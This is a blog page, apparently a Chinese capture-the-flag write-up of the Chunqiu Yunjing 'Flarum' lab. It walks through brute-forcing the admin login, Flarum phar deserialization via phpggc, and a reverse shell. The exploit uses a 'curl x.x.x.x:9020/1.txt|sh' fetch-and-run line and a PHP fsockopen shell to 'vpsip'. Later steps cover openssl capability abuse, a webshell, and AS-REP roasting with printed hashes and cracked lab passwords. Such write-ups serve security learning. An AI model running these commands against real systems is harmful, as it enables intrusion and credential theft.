@@ -1,0 +1,663 @@
+<!DOCTYPE html>
+<html lang="en">
+    
+    <head>
+    <meta charset="utf-8">
+    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" name="viewport" />
+    <meta name="description" content="春秋云镜Flarum-wp" />
+    <meta name="hexo-theme-A4" content="v1.8.8" />
+    <link rel="alternate icon" type="image/webp" href="/img/favicon.webp">
+    <title>Hexo</title>
+
+    
+        
+<link rel="stylesheet" href="/css/highlight/style1.css">
+
+        
+<link rel="stylesheet" href="/css/reset.css">
+
+        
+<link rel="stylesheet" href="/css/markdown.css">
+
+        
+<link rel="stylesheet" href="/css/fonts.css">
+ 
+         <!--注意：首页既不是post也不是page-->
+        
+            
+<link rel="stylesheet" href="/css/waline.css">
+
+        
+        
+        
+<link rel="stylesheet" href="/css/ui.css">
+ 
+        
+<link rel="stylesheet" href="/css/style.css">
+
+
+        
+            <!--返回顶部css-->
+            
+<link rel="stylesheet" href="/css/returnToTop.css">
+
+            
+<link rel="stylesheet" href="/css/unicons.css">
+
+        
+        
+            <!--目录-->
+            
+<link rel="stylesheet" href="/css/toc.css">
+
+        
+    
+
+    
+        
+<link rel="stylesheet" href="/css/returnToLastPage.css">
+
+    
+    
+   
+<link rel="stylesheet" href="/css/lightgallery.min.css">
+
+
+<meta name="generator" content="Hexo 7.1.1"></head>
+    
+    <style>
+        :root {
+            --waline-theme-color: #000000; 
+            --waline-color: #000000; 
+            --waline-border-color: #000000; 
+            --waline-white: #000000; 
+            --waline-bgcolor-light: #ffffff;  
+        }
+        body {
+            color: #000000;
+            background: #e4e4e4;
+        }
+        .post-md code {
+            background: #212425;
+            color: white; 
+        }
+        .post-md pre, .post-md .highlight {
+            background: #212425;
+            color: white; 
+        }
+        pre .string, pre .value, pre .inheritance, pre .header, pre .ruby .symbol, pre .xml .cdata {
+            color: #000000;
+        }
+        pre .number, pre .preprocessor, pre .built_in, pre .literal, pre .params, pre .constant {
+            color: #000000;
+        }
+        .year-font-color {
+            color: #000000 !important;
+        }
+        .wl-card span.wl-nick {
+            color: #000000; 
+        }
+        .wl-card .wl-badge {
+            border: 1px solid #000000;
+            color: #000000; 
+        }
+        .wl-btn {
+            border: 1px solid #000000; 
+            color:  #000000;  
+        }
+        .wl-btn.primary {
+            color: #ffffff; 
+        }
+        .wl-header label {
+            color: #000000;
+        }
+        a {
+            color: rgb(239, 112, 96);
+        }
+
+        .post-md a {
+            color: rgb(239, 112, 96);
+        }
+
+        .nav li a {
+            color: rgb(239, 112, 96);
+        }
+
+        .archive-main a:link {
+            color: rgb(239, 112, 96);
+        }
+        .archive-main a:visited {
+            color: rgb(239, 112, 96); 
+        }
+
+        .archive li span {
+            color: #000000;
+        }
+
+        .post-main-title {
+            color: #000000;
+        }
+
+        .post-md h1,
+        .post-md h2,
+        .post-md h3,
+        .post-md h4,
+        .post-md h5,
+        .post-md h6 {
+            color: #000000;
+        }
+
+        [data-waline] p {
+            color: #000000;
+        }
+        [data-waline] a {
+            color: #000000;
+        } 
+        .wl-sort li.active {
+            color: #000000;
+        }
+
+        .wl-card .wl-meta>span {
+            background: #ffffff;
+        }
+
+        .paper {
+            background: #e4e4e4;
+        }
+
+        .index-main {
+            background: #ffffff;
+        }
+
+        .paper-main {
+            background: #ffffff;
+        }
+
+        .wl-panel {
+            background: #ffffff;
+        }
+
+        .archive li:nth-child(odd) {
+            background: #ffffff;
+            ;
+        }
+
+        .archive li:nth-child(even) {
+            background: #ffffff;
+        }
+
+        .post-md table tr:nth-child(odd) td {
+            background: #ffffff;
+        }
+
+        .post-md table tr:nth-child(even) td {
+            background: #ffffff;
+        }
+
+    
+        .progress-wrap::after {
+            color: #000000; /* 箭头的颜色 */
+        }
+        .progress-wrap svg.progress-circle path {
+	        stroke: #000000; /* 边框的颜色 */
+        }
+        .progress-wrap::before {
+	        background-image: linear-gradient(298deg, rgb(239, 112, 96), rgb(239, 112, 96)); /* 鼠标滑过的箭头颜色 */
+         }
+
+        .return-to-last-progress-wrap::after {
+            color: #000000; /* 箭头的颜色 */
+        }
+        .return-to-last-progress-wrap svg.progress-circle path {
+	        stroke: #000000; /* 边框的颜色 */
+        }
+        .return-to-last-progress-wrap::before {
+	        background-image: linear-gradient(298deg, rgb(239, 112, 96), rgb(239, 112, 96)); /* 鼠标滑过的箭头颜色 */
+         }
+
+         .left-toc-container::-webkit-scrollbar-thumb {
+            background-color: #000000; /* 设置滚动条拖动块的颜色 */
+        }
+
+        .bs-docs-sidebar .nav>.active>a,
+        .bs-docs-sidebar .nav>li>a:hover,
+        .bs-docs-sidebar .nav>li>a:focus {
+            color: rgb(239, 112, 96);
+            border-left-color: rgb(239, 112, 96);
+        }
+        .bs-docs-sidebar .nav>li>a {
+            color:  #000000;
+        }
+    </style>
+
+    
+    <body>
+        
+            <div class="left-toc-container">
+                <nav id="toc" class="bs-docs-sidebar"></nav>
+            </div>
+        
+        <div class="paper">
+            
+            
+            
+            
+                <div class="shadow-drop-2-bottom paper-main">
+                    
+
+
+<div class="header">
+    <div class="header-container">
+        <img style="
+        width: 56px;
+        height: auto;" alt="^-^" cache-control="max-age=86400" class="header-img" src="/img/favicon.webp" width="10%"></img>
+        <div class="header-content">
+            <a class="logo" href="/">Hexo</a> 
+            <span class="description"></span> 
+        </div>
+        
+    </div>
+    
+   
+    <ul class="nav">
+        
+            
+                <li><a href="/">首页</a></li>
+            
+        
+            
+                <li><a href="/list/">文章</a></li>
+            
+        
+            
+                <li><a href="/tags/">标签</a></li>
+            
+        
+            
+                <li><a href="/categories/">分类</a></li>
+            
+        
+            
+                <li><a href="/about/">关于</a></li>
+            
+        
+            
+                <li><a href="/friends/">友链</a></li>
+            
+        
+    </ul>
+</div> 
+        
+                    
+                    
+
+                    
+                    
+                    
+                    <!--说明是文章post页面-->
+                    
+                        <div class="post-main">
+
+    
+        <div class="post-main-title">
+            春秋云镜Flarum-wp
+        </div>
+      
+    
+
+    <div class="post-md">
+        
+            
+                <ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4%E8%BF%9B%E5%85%A5%E5%90%8E%E5%8F%B0"><span class="post-toc-text">密码爆破进入后台</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Flarum%E7%9A%84phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9B%E8%A1%8C%E5%8F%8D%E5%BC%B9shell"><span class="post-toc-text">Flarum的phar反序列化进行反弹shell</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#capabilitites%E6%8F%90%E6%9D%83"><span class="post-toc-text">capabilitites提权</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#AS-REP-Roasting%E7%88%86%E7%A0%B4%E7%94%A8%E6%88%B7%E5%87%AD%E6%8D%AE"><span class="post-toc-text">AS_REP Roasting爆破用户凭据</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#XShell%E5%87%AD%E6%8D%AE%E8%A7%A3%E5%AF%86"><span class="post-toc-text">XShell凭据解密</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#RBCD%E6%94%BB%E5%87%BB%E6%8B%BF%E4%B8%8BFILESERVER%E4%B8%BB%E6%9C%BA"><span class="post-toc-text">RBCD攻击拿下FILESERVER主机</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#DCSync%E8%8E%B7%E5%8F%96%E5%9F%9F%E7%AE%A1%E5%87%AD%E6%8D%AE"><span class="post-toc-text">DCSync获取域管凭据</span></a></li></ol>
+            
+        
+        <link rel="stylesheet" type="text/css" href="https://jsd.onmicrosoft.cn/npm/hexo-theme-a4@latest/source/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="密码爆破进入后台"><a href="#密码爆破进入后台" class="headerlink" title="密码爆破进入后台"></a>密码爆破进入后台</h2><p>先扫描一下端口</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">rustscan -a 39.99.228.28 -r 1-65535</span><br><span class="line"></span><br><span class="line">Open 39.99.228.28:25</span><br><span class="line">Open 39.99.228.28:22</span><br><span class="line">Open 39.99.228.28:110</span><br><span class="line">Open 39.99.228.28:80</span><br></pre></td></tr></table></figure>
+
+<p>就只开了4个端口，且此主机是linux机器</p>
+<p>80端口是用Flarum框架搭的社区</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310231440105.png" title="image-20231023144029985" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310231440105.png" alt="image-20231023144029985"></a></p>
+<p>没有找到什么可以利用的前台漏洞，只有从后台入手了。</p>
+<p>因为注册的话需要激活，而这个站是发不了邮件的，所以得利用此网站现有的用户进行操作。</p>
+<p>在注册账户的时候，他会先检测用户名是否存在，利用这点进行爆破用户名</p>
+<p>数据包如下</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310231519321.png" title="image-20231023151942244" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310231519321.png" alt="image-20231023151942244"></a></p>
+<p>在扫目录的时候，看到一个<code>/api</code>路径，里面显示了管理员的邮箱</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310231542954.png" title="image-20231023154225876" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310231542954.png" alt="image-20231023154225876"></a></p>
+<p>利用上面的数据包可以检测发现administrator用户存在</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310231543282.png" title="image-20231023154316200" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310231543282.png" alt="image-20231023154316200"></a></p>
+<p>开始爆破密码</p>
+<p>最开始用10w的字典没爆出来，然后换成rockyou.txt才爆破出来，密码为<code>1chris</code></p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310231818279.png" title="image-20231023181500432" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310231818279.png" alt="image-20231023181500432"></a></p>
+<p>但是用bp加载这个200多mb的字典太慢了，也可以使用ffuf</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ffuf -u http://39.99.228.28/login -X POST -H <span class="string">&quot;Content-Type: application/json&quot;</span> -d <span class="string">&#x27;&#123;&quot;identification&quot;:&quot;administrator&quot;,&quot;password&quot;:&quot;FUZZ&quot;,&quot;remember&quot;:false&#125;&#x27;</span> -w rockyou.txt  -v -<span class="built_in">fc</span> 401</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>登录进入后台</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310231831780.png" title="image-20231023183123697" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310231831780.png" alt="image-20231023183123697"></a></p>
+<h2 id="Flarum的phar反序列化进行反弹shell"><a href="#Flarum的phar反序列化进行反弹shell" class="headerlink" title="Flarum的phar反序列化进行反弹shell"></a>Flarum的phar反序列化进行反弹shell</h2><p>p牛有一篇关于flarum后台漏洞的文章：<a target="_blank" rel="noopener" href="https://tttang.com/archive/1714/">从偶遇Flarum开始的RCE之旅</a></p>
+<p>利用方式即:</p>
+<ol>
+<li>利用<a target="_blank" rel="noopener" href="https://lesscss.org/features/#import-atrules-feature"><code>@import</code></a>来控制css文件头的内容，来使tar格式的phar文件能够成功反序列化</li>
+<li>利用<code>data-uri</code>函数来读取文件，并通过<code>phar://</code>来进行phar反序列化</li>
+</ol>
+<p>先用phpgcc生成一个tar格式的phar文件，内容为执行反弹shell的命令</p>
+<p>这里我看别人的wp才知道，不能直接直接命令来弹shell，需要通过其他方式</p>
+<p>先在一个端口开http服务，放入弹shell的命令文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="string">&#x27;$sock=fsockopen(&quot;vpsip&quot;,9010);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>然后再反序列化执行命令，将其下载下来再执行，进行反弹shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php phpggc -p tar -b Monolog/RCE6 system <span class="string">&quot;curl x.x.x.x:9020/1.txt|sh&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>后台修改：</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310231839634.png" title="image-20231023183934549" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310231839634.png" alt="image-20231023183934549"></a></p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310231845681.png" title="image-20231023184511600" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310231845681.png" alt="image-20231023184511600"></a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@import (inline) &#x27;data:text/css;base64,dGVzdC50eHQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADAwMDA2NjYAAAAAAAAAAAAAAAAAAAAAADAwMDAwMDAwMDA0ADE0NTE1NDUwNTUzADAwMDYyNzEgMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAB1c3RhcgAwMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAuc（略）AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p>在<code>/assets/forum.css</code>可以看到phar文件已经被写入了</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310231847442.png" title="image-20231023184705360" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310231847442.png" alt="image-20231023184705360"></a></p>
+<p>再修改自定义CSS，使用phar协议包含这个文件（可以使用相对路径）：这个路径一定要写对，否则执行不了【md</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310231924489.png" title="image-20231023192415398" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310231924489.png" alt="image-20231023192415398"></a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.test &#123;</span><br><span class="line">content: data-uri(&#x27;phar://./assets/forum.css&#x27;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>得到反弹shell</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310231926222.png" title="image-20231023192600191" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310231926222.png" alt="image-20231023192600191"></a></p>
+<h2 id="capabilitites提权"><a href="#capabilitites提权" class="headerlink" title="capabilitites提权"></a>capabilitites提权</h2><p>尝试查找suid文件进行提权</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -<span class="built_in">print</span> 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<p>发现没有可用的</p>
+<p>再查找capabilities权限的文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">getcap</span> -r / 2&gt;/dev/null</span><br><span class="line">/snap/core20/1974/usr/bin/ping cap_net_raw=ep</span><br><span class="line">/snap/core20/1405/usr/bin/ping cap_net_raw=ep</span><br><span class="line">/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin=ep</span><br><span class="line">/usr/bin/openssl =ep</span><br><span class="line">/usr/bin/mtr-packet cap_net_raw=ep</span><br><span class="line">/usr/bin/ping cap_net_raw=ep</span><br></pre></td></tr></table></figure>
+
+<p>发现openssl有cap权限，可用用来读取flag文件</p>
+<p>这个gtf网站上居然没有记录</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">openssl req -x509 -newkey rsa:2048 -keyout /tmp/key.pem -out /tmp/cert.pem -days 365 -nodes</span><br><span class="line">openssl s_server -key /tmp/key.pem -cert /tmp/cert.pem -port 8080 -HTTP</span><br></pre></td></tr></table></figure>
+
+<p>然后访问web服务获得flag01</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl --http0.9 -k <span class="string">&quot;https://39.99.228.28:8080/root/flag/flag01.txt&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310231939965.png" title="image-20231023193931910" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310231939965.png" alt="image-20231023193931910"></a></p>
+<h2 id="AS-REP-Roasting爆破用户凭据"><a href="#AS-REP-Roasting爆破用户凭据" class="headerlink" title="AS_REP Roasting爆破用户凭据"></a>AS_REP Roasting爆破用户凭据</h2><p>下载fscan，扫描一下内网</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">$ ./fscan_386 -h 172.22.60.0/24</span><br><span class="line"></span><br><span class="line">   ___                              _    </span><br><span class="line">  / _ \     ___  ___ _ __ __ _  ___| | __ </span><br><span class="line"> / /_\/____/ __|/ __| <span class="string">&#x27;__/ _` |/ __| |/ /</span></span><br><span class="line"><span class="string">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;    </span></span><br><span class="line"><span class="string">\____/     |___/\___|_|  \__,_|\___|_|\_\   </span></span><br><span class="line"><span class="string">                     fscan version: 1.8.2</span></span><br><span class="line"><span class="string">start infoscan</span></span><br><span class="line"><span class="string">trying RunIcmp2</span></span><br><span class="line"><span class="string">The current user permissions unable to send icmp packets</span></span><br><span class="line"><span class="string">start ping</span></span><br><span class="line"><span class="string">(icmp) Target 172.22.60.8     is alive</span></span><br><span class="line"><span class="string">(icmp) Target 172.22.60.15    is alive</span></span><br><span class="line"><span class="string">(icmp) Target 172.22.60.42    is alive</span></span><br><span class="line"><span class="string">(icmp) Target 172.22.60.52    is alive</span></span><br><span class="line"><span class="string">[*] Icmp alive hosts len is: 4</span></span><br><span class="line"><span class="string">172.22.60.52:8080 open</span></span><br><span class="line"><span class="string">172.22.60.42:445 open</span></span><br><span class="line"><span class="string">172.22.60.15:445 open</span></span><br><span class="line"><span class="string">172.22.60.8:445 open</span></span><br><span class="line"><span class="string">172.22.60.8:139 open</span></span><br><span class="line"><span class="string">172.22.60.15:139 open</span></span><br><span class="line"><span class="string">172.22.60.15:135 open</span></span><br><span class="line"><span class="string">172.22.60.42:135 open</span></span><br><span class="line"><span class="string">172.22.60.52:80 open</span></span><br><span class="line"><span class="string">172.22.60.52:22 open</span></span><br><span class="line"><span class="string">172.22.60.42:139 open</span></span><br><span class="line"><span class="string">172.22.60.8:135 open</span></span><br><span class="line"><span class="string">172.22.60.8:88 open</span></span><br><span class="line"><span class="string">[*] alive ports len is: 13</span></span><br><span class="line"><span class="string">start vulscan</span></span><br><span class="line"><span class="string">[*] NetInfo:</span></span><br><span class="line"><span class="string">[*]172.22.60.8</span></span><br><span class="line"><span class="string">   [-&gt;]DC</span></span><br><span class="line"><span class="string">   [-&gt;]172.22.60.8</span></span><br><span class="line"><span class="string">   [-&gt;]169.254.173.143</span></span><br><span class="line"><span class="string">[*] NetBios: 172.22.60.42    XIAORANG\FILESERVER            </span></span><br><span class="line"><span class="string">[*] NetBios: 172.22.60.8     [+]DC XIAORANG\DC              </span></span><br><span class="line"><span class="string">[*] NetInfo:</span></span><br><span class="line"><span class="string">[*]172.22.60.42</span></span><br><span class="line"><span class="string">   [-&gt;]Fileserver</span></span><br><span class="line"><span class="string">   [-&gt;]172.22.60.42</span></span><br><span class="line"><span class="string">   [-&gt;]169.254.93.169</span></span><br><span class="line"><span class="string">[*] NetInfo:</span></span><br><span class="line"><span class="string">[*]172.22.60.15</span></span><br><span class="line"><span class="string">   [-&gt;]PC1</span></span><br><span class="line"><span class="string">   [-&gt;]172.22.60.15</span></span><br><span class="line"><span class="string">   [-&gt;]169.254.145.23</span></span><br><span class="line"><span class="string">[*] NetBios: 172.22.60.15    XIAORANG\PC1                   </span></span><br><span class="line"><span class="string">[*] WebTitle: http://172.22.60.52       code:200 len:5867   title:霄壤社区</span></span><br></pre></td></tr></table></figure>
+
+<p>梳理如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">172.22.60.8 域控</span><br><span class="line">172.22.60.15 域内主机</span><br><span class="line">172.22.60.42 FILESERVER服务器</span><br><span class="line">172.22.60.52 当前主机</span><br></pre></td></tr></table></figure>
+
+<p>现在需要找到域内的用户信息，在网站后台可以发现有很多的用户，试试这些用户能不能利用起来</p>
+<p>写一个一句话木马到assets目录下，用蚁剑连接，然后将数据库用户名脱下来</p>
+<p>在config.php能看到数据库密码</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310231957490.png" title="image-20231023195718439" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310231957490.png" alt="image-20231023195718439"></a></p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310231958521.png" title="image-20231023195813459" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310231958521.png" alt="image-20231023195813459"></a></p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310231959748.png" title="image-20231023195912691" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310231959748.png" alt="image-20231023195912691"></a></p>
+<p>然后进行kerberos的AS_REP Roasting攻击（在之前需要上传frp进行内网穿透）</p>
+<p>来筛选出没有开启预身份验证的用户，并获得可以用hashcat爆破的加密字符串</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 -q python GetNPUsers.py  -dc-ip 172.22.60.8 -usersfile dict/users.txt  -format hashcat xiaorang.lab/</span><br></pre></td></tr></table></figure>
+
+<p>获得了两串hash，用hashcat爆破</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$krb5asrep$23$wangyun@XIAORANG.LAB:3e2df6b56d1730e6a7b97328d794d461$00b66b8217f501f1b0cfc68906c84934baff6a70e2edbcc9a3a5d510efd75fc3b41a9180f9d2d53d292e6da976c1edda6c59fcd352a58bd0393fd53c8071e8bb2fab30fd6b235782540c51ddb4eca663ca8aaefcf67a0a6b98372603410f10b6fe975049601f5cbff3038732bbdcadb07f9004d3e064b53f09e20b2d823557719568795c49c13ebb25f6c1d508a82475f8050eb215b9a612f64ceb7d3687948565266253263f0269ecc5063bebd268db81bf7998ea5afab00f40bf4b66c8c6d00d16faf0a8e4f7a824a19afc2b46a03f40302c2861768b9e5a38cfb4ae8f351275ffd0eb5e7c0bd869accb6e</span><br><span class="line">$krb5asrep$23$zhangxin@XIAORANG.LAB:202d5c631a9b688e65779fb379d95db0$ad69eb81483f26b3712686c18453e4093cdf63ab414fb4b0de9d1d05b4a33fd9bc45893f818da82f9926121165c37a2aea7f592dc5ec253d8f04d9b59ab8263a0f1cc0d3228db589c84548cda55b88c702a3826c2378fbc12e656ab892fdeadbcf0fa6a10595da66e62a02d68fb1db5b4bbaa0dccceeb23583fb32877f76c02f150dd432a7d0a6742de3c2e84d975272b6f4e1fac657ff692f2eba675b6b36056bad27a277a86cc662eb74e365300c344899de029371fdd63d972488d0bf4a1dcf23ade76d9e65fa54a2bbcf0899d930e2f75dd006adc86c05751bbae0b7517263766139182b6eb0fdd75962</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat  -a 0 -m 18200 hash.txt  rockyou.txt  -o 2.txt </span><br></pre></td></tr></table></figure>
+
+<p>爆破出一个用户凭据<code>wangyun/Adm12geC</code>，然后用这个凭据跑Bloodhound进行域内信息收集</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 -q python3 bloodhound.py  -u wangyun@xiaorang.lab -p Adm12geC  --zip -d xiaorang.lab -c  All -ns 172.22.60.8 --dns-tcp </span><br></pre></td></tr></table></figure>
+
+<p>可以发现 <code>FILESERVER</code>主机有DCSync权限</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310232103264.png" title="image-20231023210348157" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310232103264.png" alt="image-20231023210348157"></a></p>
